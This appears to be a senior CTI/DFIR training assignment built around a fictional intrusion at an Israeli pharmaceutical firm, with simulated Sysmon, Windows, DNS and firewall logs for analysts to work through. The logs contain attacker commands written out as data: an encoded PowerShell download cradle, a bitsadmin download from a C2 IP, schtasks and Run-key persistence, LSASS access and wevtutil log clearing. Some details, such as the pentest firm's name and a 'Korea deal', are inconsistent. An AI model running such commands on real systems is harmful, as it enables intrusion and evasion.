# Assignment 1: Reactive CTI — DFIR-Based Threat Actor Assessment and Detection Engineering

> **Level:** Senior CTI Analyst / Detection Engineer
> **Estimated time:** 40–60 hours
> **Deliverable language:** English

---

## 1. Title and Objective

**Full title:** Reactive CTI: DFIR-Based Threat Actor Assessment, Threat Hunting, and Detection Engineering

**Assignment objective:**

Given a set of DFIR artifacts from a real incident, the analyst must independently build a complete picture of what occurred: from the first indicator of compromise through a threat actor assessment, a Threat Hunting package, and a set of production-ready detections — with explicit separation between observed facts, assessments, and speculation.

---

## 2. Scenario

### 2.1 Organization

**LifeTech Pharma Ltd.** — a mid-sized Israeli pharmaceutical and biotech company headquartered in Rehovot, with manufacturing facilities in Haifa and a distribution hub in Modi'in.

- **Employees:** ~850 (650 Israel, 120 US, 80 EU and MENA remote)
- **Business:** Development and manufacturing of generic drugs and biologic APIs; export to US, EU, MENA, and Southeast Asia
- **Key assets:** Active compounds and synthesis formulas (core IP), Phase II/III clinical trial datasets, regulatory submission packages for Israeli MoH and US FDA approval, manufacturing batch control systems (SCADA-adjacent)
- **Recent business events:** LifeTech Pharma signed a licensing agreement in October 2024 with a US biopharmaceutical company for three formula licenses — total value $52M. The signed documents and formula files are stored on SERVER-RD-02 in \\SERVER-RD-02\LicenseDeals\USPartner2024\
- **Regulatory environment:** Israeli Privacy Protection Law (PPL), GxP (GMP/GCP), Israeli Drug Registration Regulations; FDA audit scheduled for Q1 2025
- **Threat relevance:** Israeli pharmaceutical IP — particularly FDA-pending drug formulas — is a documented high-value target for Iranian state-sponsored industrial espionage as well as financially motivated actors seeking to sell IP or stage double-extortion; Israeli biotech is among the most-targeted sectors by regional state actors

### 2.2 IT Infrastructure

- **AD:** Single-domain `lifetechpharma.local`, two DCs (DC01 and DC02), Windows Server 2019; ~650 workstations, Windows 10/11 Enterprise; ~80 servers (mix of 2016/2019)
- **Email:** Microsoft 365 (Exchange Online + Defender for Office 365 Plan 2); ATP policies applied but sandbox detonation not enabled for xlsm files
- **VPN:** Cisco AnyConnect 4.10, split-tunnel; MFA via Cisco Duo — required for external access, **not required** for internal RDP
- **EDR:** CrowdStrike Falcon (Prevent + Insight) — deployed on 62% of endpoints (517/838); **notably absent** on all 12 research servers and 3 manufacturing servers due to "performance concerns" raised by the Lab IT team
- **SIEM:** Splunk Enterprise 9.1 (50 GB/day licensed; current ingestion: 47–62 GB/day with frequent ingestion spikes causing index lag)
- **Sysmon:** Deployed on 60% of workstations using SwiftOnSecurity v13.30 profile; **NOT deployed** on any servers except the 4 primary file servers
- **Network:** Perimeter Palo Alto PA-5260 NGFW with IDS/IPS; internal segmentation is weak — corporate and R&D VLANs share the same default gateway, no ACL between them; no East-West traffic inspection
- **Cloud:** SharePoint Online for document collaboration; no significant IaaS workloads
- **Other tools:** WSUS for patch management (SERVER-WSUS-01, managed by Paz Levi's IT team); no network DLP; no email attachment sandboxing
- **Logging maturity:** Medium-low. PowerShell ScriptBlock logging (EID 4104) **disabled** company-wide. Process command line in Windows Security EID 4688 enabled on workstations only. DNS query logging (Sysmon EID 22) not configured. Event log retention: 7 days on endpoints, 14 days on servers (Splunk forwarding, but WSUS and R&D servers not forwarding to Splunk).

### 2.3 The Triggering Alert — Friday 15 November 2024

**18:47 IST** — The on-call SOC analyst (Tier 1) receives a CrowdStrike behavioral detection:

```
ALERT: Suspicious PowerShell Activity
Severity: High — Behavioral IOA
Host: WS-CFO-01.lifetechpharma.local  [Michal Cohen, CFO]
User: lifetechpharma\m.cohen
Process: powershell.exe (PID 3784)
Parent: OUTLOOK.EXE (PID 2240)
CommandLine: powershell.exe -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAa...
             [truncated to 448 base64 chars in alert UI]
Timestamp: 2024-11-15T18:42:33Z
SHA256 (powershell.exe): [legitimate Microsoft hash]
Tactic: Execution / Initial Access
```

The Tier 1 analyst creates a Splunk search and finds 3 additional network connections from WS-CFO-01 to an external IP within the last 15 minutes. She escalates to the Tier 2 on-call (Idan Katz), who immediately escalates to the CTI team.

**You are the on-call CTI analyst. It is now 18:55 IST. Your investigation begins.**


### 2.4 The First Two Hours: Rapid Discovery

Within two hours, the following additional facts emerge through rapid triage:

**18:58 IST** — Splunk query on `DestinationIp=203.0.113.87` across all hosts reveals DNS queries and network connections from **three hosts**, not just one:
- `WS-CFO-01.lifetechpharma.local` (expected — the triggering alert)
- `SERVER-FIN-01.lifetechpharma.local` (the finance reporting server)
- `WS-IT-LEVI.lifetechpharma.local` (Paz Levi, IT Administrator — not the CFO)

WS-IT-LEVI's first DNS query to `telemetry-cdn-services[.]biz` was at **2024-11-01 09:14:33Z** — **two weeks before the CFO alert**.

**19:12 IST** — The SOC analyst checks Microsoft 365 Message Trace and finds a suspicious email to m.cohen received at 17:58 IST. A separate trace reveals that **p.levi@lifetechpharma.co.il** received a different phishing email **on 22 October 2024 at 11:23 IST** — 24 days earlier. That email (subject: "Security Alert — MFA Re-enrollment Required") was flagged by ATP as low-confidence phish but delivered because the Microsoft 365 spam confidence level (SCL) scored only 4 (threshold: 5). The IT admin opened an attachment.

**19:31 IST** — Tier 2 runs `net session` history reconstruction and finds that `lifetechpharma\svc_backup` authenticated to **SERVER-RD-02** via SMB on **2024-11-01 at 09:18:12Z** — four minutes after WS-IT-LEVI's first DNS query to the C2 domain. `svc_backup` is a service account owned by the IT team, with read/write access to all backup targets, including the R&D file shares.

**19:47 IST** — CrowdStrike EDR query (on the 62% of covered hosts) returns a hit on SERVER-FIN-01: a suspicious PowerShell execution at 20:52 IST (still in the future when you began investigating — you are watching the incident unfold in real time). The parent process on SERVER-FIN-01 is `WmiPrvSE.exe`.

**20:04 IST** — The Splunk analyst discovers that **Windows Security logs from WS-IT-LEVI are absent from Splunk for the period Oct 22 – Nov 01, 2024**. The Sysmon forwarder on that host stopped sending data for 10 days — it restarted on Nov 01. The reason for the gap is unknown.

**20:22 IST** — The IR Lead (Noa Ben-David) joins the call. She informs you that the `svc_backup` account has **Domain Admin** membership — it was granted this permission during an emergency backup restoration in August 2024 and the permission was never revoked. This means any actor controlling `svc_backup` has full domain administrator access to all 80 servers.

**21:16 IST** — A new CrowdStrike alert fires:

```
ALERT: Suspicious Security Log Clear
Host: WS-CFO-01.lifetechpharma.local
Process: wevtutil.exe
CommandLine: wevtutil.exe cl Security
Timestamp: 2024-11-15T21:14:55Z
```

The Windows Security log on WS-CFO-01 has been partially cleared. The Sysmon log is intact (Sysmon logs to a separate protected channel).

**21:31 IST** — R&D team member Tamar Shapiro calls the SOC emergency number: she noticed that the network share `\\SERVER-RD-02\LicenseDeals\USPartner2024\` is showing last-modified timestamps of **2024-11-06 02:14 UTC** for all 47 files in the directory — she last modified them on November 4th. This directory contains the final formula packages for the US licensing deal.

### 2.5 Expanding Scope: What Has Been Compromised

By 22:00 IST on 15 November, the investigation scope has expanded significantly:

**Potentially compromised systems:**
| Host | Role | EDR Coverage | Sysmon | Status |
|---|---|---|---|---|
| WS-CFO-01.lifetechpharma.local | CFO workstation | ✓ CrowdStrike | ✓ Deployed | **Confirmed compromised** |
| SERVER-FIN-01.lifetechpharma.local | Finance reporting server | ✓ CrowdStrike | ✗ Not deployed | **Confirmed compromised** |
| WS-IT-LEVI.lifetechpharma.local | IT Admin workstation | ✓ CrowdStrike | ✓ Deployed | **Suspected compromised** |
| SERVER-RD-02.lifetechpharma.local | R&D file server | ✗ No EDR | ✗ Not deployed | **Suspected — data access confirmed** |
| DC01.lifetechpharma.local | Primary Domain Controller | ✗ No EDR | ✗ Not deployed | **Unknown — svc_backup DA access** |
| SERVER-WSUS-01.lifetechpharma.local | WSUS / patch management | ✗ No EDR | ✗ Not deployed | **Unknown — IT admin managed** |

**Potentially stolen data:**
- US licensing deal formulas (47 files, ~380 MB compressed) — accessed/copied Nov 6
- Finance reports from SERVER-FIN-01 (scope unknown)
- AD credentials (if DCSync was performed via svc_backup's DA rights — unconfirmed)

**Two separate intrusion paths — potentially:**
- **Path A (CFO):** Spearphishing email (xlsm) → PowerShell loader → C2 beacon → NTLM lateral movement → SERVER-FIN-01
- **Path B (IT Admin):** Different phishing email (MFA re-enrollment lure) → credential harvest or malware on WS-IT-LEVI → svc_backup credential access → SERVER-RD-02 data exfiltration

**Key analytical question:** Are Path A and Path B the same threat actor? Or two independent actors who happened to target the same organization at the same time? The C2 domain is the same (`telemetry-cdn-services[.]biz`), but the infection vectors and timelines differ significantly.

### 2.6 Prior Activity Timeline (Reconstructed)

The following prior events, reconstructed from available logs, indicate the breach began **24 days before the triggering alert**:

| Date / Time (UTC) | Host | Event | Source | Reliability | Notes |
|---|---|---|---|---|---|
| 2024-10-22 11:23 | Exchange Online | Phishing email to p.levi — "MFA Re-enrollment Required" | M365 ATP log | High | ATP SCL=4, delivered. Attachment: `mfa-enrollment-2024.html` |
| 2024-10-22 11:31 | WS-IT-LEVI | Unknown activity (log gap begins) | — | N/A | Sysmon forwarder stopped |
| 2024-10-24 02:17 | Azure AD | VPN login as `p.levi` from IP 77.99.xxx.xxx (Istanbul, Turkey) | Azure AD sign-in | High | Paz Levi lives in Rehovot. No travel. No MFA challenge recorded |
| 2024-10-24 02:19 | DC01 | 4624 Network logon for svc_backup from 10.10.3.22 (= WS-IT-LEVI) | Windows Security | High | Service account login outside business hours |
| 2024-10-25 03:41 | SERVER-FIN-01 | svc_backup accessed `\\SERVER-FIN-01\FinanceReports\2024\` | File share audit | Medium | Audit log incomplete — only access timestamp, not filenames |
| 2024-11-01 09:14 | WS-IT-LEVI | DNS query to `telemetry-cdn-services[.]biz` | Palo Alto DNS log | High | First appearance of this domain in the environment |
| 2024-11-01 09:18 | SERVER-RD-02 | svc_backup SMB logon (type 3) from WS-IT-LEVI | Windows Security | High | Accessed `\LicenseDeals\USPartner2024\` share |
| 2024-11-01 09:22 | Sysmon forwarder | Log forwarding resumes on WS-IT-LEVI | Splunk | Medium | Reason for 10-day gap unknown — possible anti-forensics |
| 2024-11-06 02:14 | SERVER-RD-02 | 47 files in `\USPartner2024\` modified timestamp | File system | High | Files accessed/read/modified at 02:14 UTC (off-hours) |
| 2024-11-06 02:31 | Firewall (indirect) | Large outbound transfer from 10.10.2.15 (= SERVER-RD-02) to external IP | Firewall log | Medium | Only netflow available — IP not in current IOC list |
| 2024-11-12 – 2024-11-15 | Multiple | **Authorized pentest by CyberGuard Solutions Ltd.** (documented in Change Management) | Change mgmt | High | See Section 2.7 |
| 2024-11-15 17:58 | Exchange Online | Spearphishing email to m.cohen (xlsm attachment) | M365 Message Trace | High | SPF/DKIM/DMARC Fail |
| 2024-11-15 18:42 | WS-CFO-01 | Outlook → PowerShell -Enc → C2 | CrowdStrike + Sysmon | High | Triggering alert |
| 2024-11-15 21:14 | WS-CFO-01 | Security event log cleared via wevtutil.exe | CrowdStrike | High | Anti-forensics |

### 2.7 Complicating Factors

The investigation is significantly complicated by the following:

**Authorized Pentest (CyberGuard Solutions Ltd., Nov 12–15):**
LifeTech Pharma's quarterly red team assessment was running concurrently with the actual intrusion. CyberGuard Solutions Ltd. conducted a 4-day external + internal pentest from November 12 to November 15. Their engagement scope included:
- External network reconnaissance and phishing simulation (authorized)
- Internal lateral movement testing using Cobalt Strike (authorized, from a pentest workstation on VLAN 99)
- Pentest workstation IP range: 10.10.99.0/24

Some of the network scanning activity, PowerShell executions, and lateral movement patterns in the logs for November 12–15 **may be attributable to the authorized pentest** and not the threat actor. CyberGuard Solutions Ltd. has not yet provided their engagement report. Their pentest operator is unavailable until Monday (it is currently Friday evening). This creates significant attribution uncertainty for artifacts generated between Nov 12–15.

**Legal Hold on WS-IT-LEVI:**
At 20:45 IST, LifeTech Pharma's legal counsel issued a hold order on Paz Levi's workstation pending an internal HR investigation. The reason is unrelated to the security incident — Paz Levi is under investigation for a separate compliance matter. This means the CTI/IR team cannot access WS-IT-LEVI's physical hardware without a separate legal authorization process that takes 48–72 hours. Remote forensic collection via CrowdStrike RTR (Real Time Response) is permitted.

**Splunk Capacity Constraints:**
The Splunk instance is operating at 105% of licensed capacity on Friday evening (end-of-week reporting jobs). Search queries with broad time ranges are timing out after 240 seconds. Several retrospective searches return incomplete results. The index lag is approximately 8 minutes.

**CFO's Travel Plans:**
Michal Cohen (CFO) is departing for Singapore at 06:30 IST Saturday for a board presentation. He is requesting his laptop back by 05:30 IST. The IR Lead must balance containment needs with executive pressure from the C-suite.

**SERVER-RD-02 Availability:**
SERVER-RD-02 is a critical system: the R&D team's file server. Isolating it would block access for 45 researchers over the weekend. The R&D Director has asked that isolation be avoided unless "absolutely necessary." There is no read-only backup of the US deal files available.

**Confounding DNS traffic:**
LifeTech Pharma uses a third-party telemetry service called "CDN-Analytics Pro" for website performance monitoring, which generates DNS queries to `cdn-analytics[.]pro` — a completely different domain, but the name similarity to the C2 domain `telemetry-cdn-services[.]biz` is causing confusion in initial log searches.

**Memory Dump Availability:**
CrowdStrike RTR performed a memory acquisition of WS-CFO-01 at 21:00 IST. The dump is 8 GB and has been transferred to the IR workstation. The malware analysis team will be available at 08:00 IST Saturday. Preliminary strings analysis has been performed — see Section 4.10.

### 2.8 Current Status at Investigation Start (Your Handover Point)

You are taking over the investigation at **22:30 IST on 15 November 2024**. The following has been done:

- WS-CFO-01: Network isolated via CrowdStrike policy. Memory dump collected. Sysmon logs available.
- SERVER-FIN-01: NOT yet isolated (decision pending — critical finance system). CrowdStrike active.
- WS-IT-LEVI: Legal hold — remote CrowdStrike RTR access only, no hardware access.
- SERVER-RD-02: NOT isolated. No EDR, no Sysmon. Only Windows event logs (if accessible remotely).
- DC01: No action taken yet.

The CISO is on a call with the Board Chair and wants a preliminary assessment in **90 minutes**.

### 2.9 Initial Unknowns

| Unknown | Why It Matters | Data Required |
|---|---|---|
| Whether Path A (CFO) and Path B (IT admin) are the same actor | Determines whether this is coordinated or two simultaneous compromises | Payload comparison, C2 overlap, timeline correlation |
| Full scope of data exfiltration | Israeli PPL, FDA NDA obligations depend on whether formula data left the network | DLP logs (none available), firewall flows, endpoint staging artifacts |
| Whether DCSync was executed via svc_backup DA rights | If yes, all AD credentials are compromised and all 80 servers must be treated as potentially compromised | DC01 logs (currently inaccessible) |
| Whether pentest artifacts contaminate the Nov 12–15 evidence | Cannot attribute behavior to attacker vs. pentest without SecureTest report | SecureTest engagement report (unavailable until Monday) |
| Whether the 10-day Sysmon log gap on WS-IT-LEVI was intentional anti-forensics | Determines attacker sophistication | Forensic analysis of WS-IT-LEVI disk (blocked by legal hold) |
| Whether SERVER-WSUS-01 was used as a lateral movement vector | WSUS server managed by Paz Levi; could be weaponized for mass lateral movement | WSUS server logs (not in Splunk) |
| Whether the exfiltration from SERVER-RD-02 on Nov 6 was successful | 47 formula files may be in adversary hands | Firewall flow data for that IP on that date (14-day retention — logs still available) |
| Whether any other hosts are beaconing to the C2 | The 3 known hosts may not be the full scope | Full DNS log pivot across all internal IPs |

### 2.10 Stakeholder Expectations

| Stakeholder | Expectation | Deadline | Format |
|---|---|---|---|
| CISO (Dr. Yael Mizrahi) | Preliminary assessment: confirmed scope, known data at risk, containment recommendation | 00:00 IST (90 min) | Verbal + 1-page brief |
| Board Chair (via CISO) | Whether the US licensing deal IP has been exfiltrated | 00:00 IST | Yes/No with confidence level |
| IR Lead (Noa Ben-David) | Full technical timeline, all compromised hosts, containment priority order | 06:00 IST | Technical document |
| Legal Counsel | Israeli PPL breach notification assessment — is notification to Privacy Protection Authority required? | 08:00 IST | Legal brief |
| SOC Manager | Immediate blocking IOCs, hunting queries for other potentially infected hosts | 23:30 IST | IOC list + SPL queries |
| Detection Engineering | Gap analysis and new detection rules | 48 hours | Sigma + SPL |
| R&D Director | Whether the Korea deal data should be assumed exfiltrated (for notification to US partner) | 08:00 IST | Factual assessment |

### 2.11 Available Resources

- **CTI team:** You (senior analyst, on-call) + one junior analyst available from 07:00 IST
- **Splunk access:** Yes, but constrained (see Section 2.7)
- **CrowdStrike RTR:** Enabled for covered hosts
- **External IR vendor:** On retainer, can be engaged — but 4-hour mobilization time
- **Pentest firm:** Unavailable until Monday morning
- **Memory analysis:** Available from 08:00 IST Saturday

---

## 3. Learning Objectives

After completing this assignment, the analyst should be able to:

1. Build an incident timeline from heterogeneous DFIR artifacts, including contested evidence and log gaps
2. Separate **observed facts**, **reported information**, **assessments**, and **speculation** — and explicitly label each category
3. Handle **evidence contamination** — distinguish attacker activity from authorized pentest activity without direct pentest report access
4. Extract IOCs and IOAs, distinguishing their strategic value (IOC = retrospective, IOA = behavioral, durable)
5. Assess **multi-path intrusions** — determine whether two apparent entry points represent one actor, two actors, or a single actor using two vectors
6. Map observed behavior to MITRE ATT&CK with Confidence Level and caveats for each technique
7. Conduct proper threat actor / activity cluster assessment without overclaiming attribution
8. Prioritize containment recommendations under time pressure and organizational constraints
9. Create Threat Hunting hypotheses that address the confirmed infection pattern and the unconfirmed lateral scope
10. Write detections (Sigma, Splunk SPL, KQL) that will catch this activity — and explain what telemetry was missing that would have enabled earlier detection
11. Produce deliverables at different levels: technical (for IR/SOC) and managerial (for CISO/Legal/Board)

---

## 4. Input Materials

> **Note on data provenance:** All artifacts below are drawn from logs available to the CTI team at 22:30 IST on 15 November 2024. Artifacts marked [PARTIAL] indicate incomplete data due to log gaps, retention limits, or constrained tooling. The pentest (Nov 12–15) was scope-limited to the 10.10.99.0/24 VLAN; any events from non-pentest IPs during that period are attributable to normal operations or the threat actor.

### 4.1 Sysmon Events — WS-CFO-01 (Primary Compromise)

**EID 1 — Process Creation @ 18:42:33Z**
```
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAaABlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlAC...
             [448 chars total — decoded: downloads and executes a second-stage loader via HTTPS from 203.0.113.87/update]
ParentImage: C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE
ParentCommandLine: "OUTLOOK.EXE" /recycle
CurrentDirectory: C:\Users\m.cohen\Desktop\
User: lifetechpharma\m.cohen
Hashes: SHA256=8f4a2c1e9b3d7f6e0a5c8b2d4e9f1a3c5b7d0e2f4a6c8b0d2e4f6a8c0b2d4e6
IntegrityLevel: Medium
LogonId: 0x4A2F1
```

**EID 1 — Process Creation @ 18:44:17Z**
```
Image: C:\Windows\System32\cmd.exe
CommandLine: cmd.exe /c net user /domain
ParentImage: powershell.exe (PID 3784)
User: lifetechpharma\m.cohen
```

**EID 1 — Process Creation @ 18:44:52Z**
```
Image: C:\Windows\System32\cmd.exe
CommandLine: cmd.exe /c net group "Domain Admins" /domain
ParentImage: powershell.exe (PID 3784)
```

**EID 1 — Process Creation @ 18:45:22Z**
```
Image: C:\Windows\System32\cmd.exe
CommandLine: cmd.exe /c systeminfo
ParentImage: powershell.exe (PID 3784)
```

**EID 3 — Network Connection @ 18:46:02Z**
```
Image: powershell.exe
SourceIp: 10.10.5.42  [WS-CFO-01]
DestinationIp: 203.0.113.87  [RFC5737 documentation range — scenario: C2 server]
DestinationPort: 443
Protocol: tcp
```

**EID 10 — Process Access @ 19:01:44Z**
```
SourceImage: powershell.exe
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1010
CallTrace: ntdll.dll+... | KERNELBASE.dll+...
```

**EID 11 — File Created @ 19:03:12Z**
```
Image: powershell.exe
TargetFilename: C:\Users\m.cohen\AppData\Local\Temp\~tmp4F3A.tmp
CreationUtcTime: 2024-11-15 19:03:12.001
```

**EID 11 — File Created @ 19:04:07Z**
```
Image: powershell.exe
TargetFilename: C:\Users\m.cohen\AppData\Roaming\svchost32.exe
CreationUtcTime: 2024-11-15 19:04:07.441
```

**EID 13 — Registry Value Set @ 19:17:28Z**
```
Image: powershell.exe
TargetObject: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SysUpdate
Details: C:\Users\m.cohen\AppData\Roaming\svchost32.exe
```

**EID 1 — Process Creation @ 19:22:05Z (schtasks.exe)**
```
Image: C:\Windows\System32\schtasks.exe
CommandLine: schtasks /create /tn "\Microsoft\Windows\WDF\SysCheckUpdate" /tr "C:\Users\m.cohen\AppData\Roaming\svchost32.exe" /sc daily /st 09:00 /f
ParentImage: powershell.exe
```

**EID 1 — Process Creation @ 20:48:02Z (BITS transfer)**
```
Image: C:\Windows\System32\bitsadmin.exe
CommandLine: bitsadmin /transfer SysUpdate /download /priority FOREGROUND https://203.0.113.87/update2 C:\Users\m.cohen\AppData\Local\Temp\svc_upd.tmp
ParentImage: powershell.exe (PID 4412 — second-stage implant process)
```
> Note: BITS is a common LOLBin used for stealthy downloads. The second implant binary `svc_upd.tmp` was later renamed. CrowdStrike did not alert on this BITS usage — the rule threshold was not met.

**EID 1 — wevtutil.exe @ 21:14:55Z**
```
Image: C:\Windows\System32\wevtutil.exe
CommandLine: wevtutil.exe cl Security
ParentImage: powershell.exe (PID 4412)
User: lifetechpharma\m.cohen
```

### 4.2 Sysmon Events — SERVER-FIN-01 (Lateral Movement Target)

**EID 1 — Process Creation @ 20:52:18Z**
```
Image: powershell.exe
CommandLine: powershell.exe -NonI -W Hidden -Enc [512-char base64 — different from CFO base64]
ParentImage: C:\Windows\System32\WmiPrvSE.exe
ParentCommandLine: wmiprvse.exe -secured -Embedding
User: lifetechpharma\svc_finreport
Computer: SERVER-FIN-01.lifetechpharma.local
```

> No Sysmon deployed on SERVER-FIN-01 — these events were collected from the CrowdStrike sensor.

**EID 1 — Process Creation @ 20:54:11Z**
```
Image: C:\Windows\System32\cmd.exe
CommandLine: cmd.exe /c dir C:\FinanceData\Consolidation\2024\ /s
ParentImage: powershell.exe
```

**EID 11 — File Created @ 21:01:22Z**
```
Image: powershell.exe
TargetFilename: C:\Windows\Temp\FR_2024_consolidated.zip
```
> A zip archive of finance data was created in C:\Windows\Temp — consistent with staging for exfiltration.

### 4.3 Sysmon Events — WS-IT-LEVI (IT Admin Workstation, Suspected Second Entry Point)

> **IMPORTANT:** CrowdStrike RTR access only due to legal hold. The following events are retrieved via RTR remote query. Events prior to 2024-11-01 have a 10-day gap (Oct 22 – Nov 01) — the Sysmon Windows Event Log on this host shows Event ID 7045 (new service installed) on Nov 01 at 09:22:03Z — a Windows Defender service was briefly disabled and re-enabled, coinciding with the log forwarding restart.

**EID 1 @ 2024-11-01 09:14:11Z — net.exe**
```
Image: C:\Windows\System32\net.exe
CommandLine: net user /domain
ParentImage: powershell.exe
User: lifetechpharma\p.levi
```

**EID 1 @ 2024-11-01 09:17:04Z — PowerShell with encoding**
```
Image: powershell.exe
CommandLine: powershell.exe -NonI -W Hidden -Enc [256-char base64]
ParentImage: C:\Windows\explorer.exe
User: lifetechpharma\p.levi
```
> Parent is explorer.exe, not OUTLOOK.EXE — different execution mechanism than the CFO compromise. The C2 connection from this host used the same destination domain.

**EID 3 @ 2024-11-01 09:21:44Z — Network connection**
```
Image: powershell.exe
DestinationIp: 203.0.113.87
DestinationPort: 443
```
> Same C2 IP as the CFO compromise, but the beacon interval from this host averages **5 minutes ±45 sec** — different from the 3-minute interval observed on WS-CFO-01.

**EID 13 @ 2024-11-01 09:33:17Z — Registry**
```
TargetObject: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinTelUpdate
Details: C:\Users\p.levi\AppData\Roaming\UpdateHelper.dll
```
> Note: The persistence mechanism uses a different binary name (`UpdateHelper.dll`) than the CFO host (`svchost32.exe`). The DLL is registered in Run Key as executable — it is actually a DLL with RunDLL32 execution, but the full command was not captured here (requires more investigation).

### 4.4 Events from SERVER-RD-02 (R&D Server — No EDR, No Sysmon)

> Only Windows Security Event Log available. Retrieved via remote query at 22:15 IST.

**EID 4624 — Successful Network Logon @ 2024-11-01 09:18:12Z**
```
Computer: SERVER-RD-02.lifetechpharma.local
SubjectUserName: svc_backup
LogonType: 3 (Network)
IpAddress: 10.10.3.22  [WS-IT-LEVI]
AuthenticationPackage: NTLM
```

**EID 4624 — Successful Network Logon @ 2024-11-06 02:09:41Z**
```
Computer: SERVER-RD-02.lifetechpharma.local
SubjectUserName: svc_backup
LogonType: 3 (Network)
IpAddress: 10.10.3.22  [WS-IT-LEVI]
AuthenticationPackage: NTLM
```

**EID 4663 — File Access Audit @ 2024-11-06 02:10:04Z – 02:14:31Z**
```
Computer: SERVER-RD-02.lifetechpharma.local
SubjectUserName: svc_backup
ObjectName: \Device\HarddiskVolume2\LicenseDeals\USPartner2024\
Accesses: ReadData (or ListDirectory), WriteData (or AddFile)
[47 individual 4663 events — one per file — accessed and then modified timestamp updated]
```
> The sequence of 4663 events shows the files were read and their metadata modified. The 4663 events alone do not confirm exfiltration — they confirm that the files were accessed by svc_backup. A network connection during this window is required to confirm exfiltration.

**[PARTIAL] EID 5156 — Windows Filtering Platform @ 2024-11-06 02:14:39Z**
```
Computer: SERVER-RD-02.lifetechpharma.local
Application: System  [indicates kernel-mode network stack, not a user process]
Direction: Outbound
SourceAddress: 10.10.2.15
DestAddress: [REDACTED — logged at firewall level, not in Windows Security log]
DestPort: 443
```
> This EID 5156 event confirms outbound HTTPS traffic from SERVER-RD-02 during the file access window. The destination IP is visible in the Palo Alto firewall logs for this date (14-day retention — logs are still available). **The analyst must retrieve this firewall log to determine whether exfiltration occurred and to what IP.**

### 4.5 Domain Controller Events — DC01 (Partial — No Remote Access Yet)

> The following events were extracted from a Splunk saved search that ran against a partial DC log forwarding set (only EID 4662 and 4776 were forwarded from DC01 to Splunk — an incomplete forwarding configuration).

**EID 4776 — Credential Validation @ 2024-10-24 02:17:11Z**
```
Computer: DC01.lifetechpharma.local
TargetUserName: p.levi
Workstation: UNKNOWN
Error Code: 0x0 (success)
```
> Authentication from unknown workstation at 02:17 UTC — 4:17 AM Rehovot time (IST). Paz Levi's VPN connection from Turkey was active at this time.

**EID 4662 — Object Access (DS-Replication-related) @ 2024-11-06 02:48:19Z**
```
Computer: DC01.lifetechpharma.local
SubjectUserName: svc_backup
ObjectType: {19195a5b-6da0-11d0-afd3-00c04fd930c9}  [= DS-Replication-Get-Changes]
Properties: Read Property
```
> **This is a high-severity finding.** EID 4662 with the DS-Replication-Get-Changes object type is the telltale signature of a **DCSync attack** — a technique that allows an account with replication rights (which a Domain Admin has) to request password hashes for any account, including krbtgt. If this is a genuine DCSync, all AD credentials must be assumed compromised. However: (1) the `Advanced Audit Policy — DS Access: Audit Directory Service Access` was recently enabled on DC01 as part of the pentest preparation, and (2) the authorized pentest scope did NOT include DCSync testing (per the change management record). This event requires immediate investigation.

### 4.6 Windows Security Events — WS-CFO-01

```
EID 4688 @ 18:44:19Z
NewProcessName: C:\Windows\System32\net.exe
CommandLine: net user /domain
SubjectUserName: m.cohen

EID 4698 @ 19:22:05Z  [Scheduled Task Created]
SubjectUserName: m.cohen
TaskName: \Microsoft\Windows\WDF\SysCheckUpdate
TaskContent: <Actions><Exec><Command>C:\Users\m.cohen\AppData\Roaming\svchost32.exe</Command></Exec></Actions>

EID 4624 @ 20:48:33Z  [Network logon to SERVER-FIN-01 from WS-CFO-01]
SubjectUserName: svc_finreport
LogonType: 3
IpAddress: 10.10.5.42  [WS-CFO-01]
AuthenticationPackage: NTLM

EID 1102 @ 21:14:58Z  [Security Event Log Cleared]
SubjectUserName: m.cohen
```

### 4.7 DNS Logs (Palo Alto / Internal Resolver)

```
Timestamp                Client IP    Query                                      Response
2024-10-24 02:19:33      10.10.3.22   telemetry-cdn-services[.]biz               203.0.113.87  [WS-IT-LEVI — earliest]
2024-11-01 09:14:33      10.10.3.22   telemetry-cdn-services[.]biz               203.0.113.87
2024-11-01 09:19:14      10.10.3.22   a1.telemetry-cdn-services[.]biz            203.0.113.87
[IT admin host shows 5-min beacon interval, subdomain rotation: a1→b2→c3→d4]

2024-11-06 02:10:08      10.10.2.15   sys-update-cdn[.]net                       198.51.100.44  [RFC5737 — SERVER-RD-02]
[NEW DOMAIN — different from CFO and IT admin C2. Only 4 DNS queries total.]

2024-11-12 09:33:11      10.10.99.14  telemetry-cdn-services[.]biz               203.0.113.87  [10.10.99.0/24 = PENTEST VLAN]
[Pentest operator queried the C2 domain during their engagement — for reconnaissance? or to test blocking?]

2024-11-15 18:46:08      10.10.5.42   telemetry-cdn-services[.]biz               203.0.113.87  [WS-CFO-01]
2024-11-15 18:46:14      10.10.5.42   a1.telemetry-cdn-services[.]biz            203.0.113.87
2024-11-15 18:49:02      10.10.5.42   b2.telemetry-cdn-services[.]biz            203.0.113.87
[3-min beacon interval, same rotation pattern as IT admin host]
2024-11-15 20:52:25      10.10.1.20   telemetry-cdn-services[.]biz               203.0.113.87  [SERVER-FIN-01]
```

> **Note the anomaly:** The pentest VLAN (10.10.99.x) also queried the C2 domain on Nov 12. This may indicate the pentest operator was researching known malicious infrastructure during their engagement, OR that the pentest team's tools briefly called out to this domain. This requires clarification from CyberGuard Solutions Ltd..

> **Second C2 domain:** `sys-update-cdn[.]net` resolving to 198.51.100.44 appears only in SERVER-RD-02's DNS history. It is a **different C2 infrastructure** from the primary domain. This may indicate: (a) the same actor uses different C2 per operational stage, (b) a different actor, or (c) the IT admin's tooling differs from the CFO's tooling. This is a significant analytical question.

### 4.8 Proxy / Firewall Logs

**WS-CFO-01 outbound (Nov 15):**
```
18:46:10  10.10.5.42 → 203.0.113.87:443  CONNECT  2,840 out / 187,330 in
18:46:15  10.10.5.42 → 203.0.113.87:443  TLS      48,220 out / 12,104 in
[47 HTTPS sessions total — average interval 183 sec ±28 sec]
21:14:09  10.10.5.42 → 203.0.113.87:443  TLS      4,521,334 out / 22,109 in  [LARGE UPLOAD]
```

**SERVER-RD-02 outbound (Nov 6):**
```
